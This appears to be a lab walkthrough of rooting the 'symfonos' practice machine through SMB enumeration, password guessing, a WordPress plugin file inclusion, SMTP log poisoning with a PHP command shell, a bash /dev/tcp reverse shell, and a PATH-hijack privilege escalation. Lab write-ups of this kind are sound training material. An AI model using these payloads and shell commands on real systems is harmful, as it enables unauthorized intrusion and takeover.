
---
First we discover which is the IP the machine has.

![[Pasted image 20240712160943.png]]

After that, we run a command on [[nmap]] to discover the open ports that the machine has.

![[Pasted image 20240712161307.png]]

Now we discover what service is running on each port.

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:0E:AF:F8 (VMware)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2024-07-12T16:12:40-05:00
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-07-12T21:12:41
|_  start_date: N/A

```

With gobuster we don't discover any important information. In the [[nmap]] we can see that in the port 445 of [[smb]] there's a anonymous session. So we connect to it.

We can confirm that with tools like [[enum4linux]]. We are gonna connect directly to the service. 

![[Pasted image 20240712172549.png]]

We discover that there is an anonymous directory. We connect to get the information of the directory. Also, we discover that there is other user with the name "helios".

![[Pasted image 20240712172725.png]]

We discover that there is a file name **attention.txt** so we proceed to download it and check what's inside. The admin says that there are some accounts that are using common passwords and we have a user called **helios**. We can try what that. For the next move we need to try each password with the **"helios"** username. And we find out that the correct password is **"qwerty"**.

![[Pasted image 20240714112030.png]]

We find out that there are two files that we can download.

![[Pasted image 20240714112213.png]]

With the todo.txt we discovered that there's a directory called /h3l105. When we enter for the first time to the directory we can note that there are no styles. So at this time, we checked the source code and discover that we have to add the domain symfonos.local to the /etc/hosts

![[Pasted image 20240714112426.png]]

When we added that information and request again but now the URL symfonos.local/h3l105 we found that this web page is using a [[wordpress]] cms

As we know the machine has a [[wordpress]] CMS running so we first we need to check if it has any vulnerabilities, so we can use [[wpscan]]. When we first ran the command with no additional variables we can see that there are some plugins that are running on the system so it's important that we have all plugins listed so we can check if any of them have a vulnerability.

So we ran the command to retrieve all plugins information.

`wpscan --url http://symfonos.lolca/h3l105/  -e ap'

The information that we've got is the following:

![[Pasted image 20240714171159.png]]

When we search information about the plugin **mail-masta** we can check that it's vulnerable to [[local file inclusion]]. 

![[Pasted image 20240714171340.png]]

First let's see if the POC works on the wordpress that we are working on.

![[Pasted image 20240714171502.png]]

And we can see that it worked! 😸 But the only problem here is that we can't execute any command just read the file that we put on the final url. Now, we need to go back to the nmap targeted output, we noticed that there is a [[SMTP]] and we know that all mails that have been sent trough that port is stored on the /var/mail/username (we know that the user is helios). So first we need to know if we can check that file.

![[Pasted image 20240714172638.png]]

Now we know that if we send a mail trough [[SMTP]] the information is going to be store on there and also the web page is reading all as php so if we upload a php shell we can execute command on there.

```Connect to the service
telnet 172.16.136.129 25

#set the mail
MAIL FROM: test@test.com

#Set the recipient's mail
RCPT TO: helios

#Set the information
DATA

#Information of the mail (you need to end with a dot at the end)
php system($\_GET['cmd']) ?
. 

#Quit the session
quit
```

When we upload correctly the mail we can check it on the web by adding a extension to execute any bash command.

![[Pasted image 20240714173447.png]]

At this time, we know can execute our reverse shell. So first we listen in the port 4545 with `nc -lnvp 4545` and the execute the next command on the machine `bash -c 'sh -i >& /dev/tcp/172.16.136.1/4545 0>&1'` (dont forget to URL encode the command). 

And we have a shell 🍾!!!

![[Pasted image 20240714173820.png]]

Lets make an [[interactive shell]]

## Privilege Escalation

We have on a Linux kernel enviroment so we need to make a Linux Escalation. So the first thing is that we cannot run sudo commands so let's check if there's something especial on the SUID files.

![[Pasted image 20240714174136.png]]

We can check that there is a file called **'statuscheck'**. We first need to know what the file is doing. When we cat the file it's unreadable. so with the command string we can know if there is something readable that we can take advantage of.

![[Pasted image 20240714174539.png]]

We can see there's a curl running on so we can take advantage of the vulnerability [[path hijacking]] and change the path variable so when the command curl is being executed run the command that we are gonna add at the beginning of the path.

```
echo 'chmod u+s /bin/bash' > /tmp/curl; chmod +x /tmp/curl; export PATH=/tmp:$PATH
```

What this command will do is when we run the **'statuscheck'** file the /bin/bash is going to be SUID binary so we can have a root session.

![[Pasted image 20240714175221.png]]

As we can see, now '/bin/bash' is a SUID binary so we can run the command `/bin/bash -p' to get root privileges`.

![[Pasted image 20240714175241.png]]

We are root!! 😈
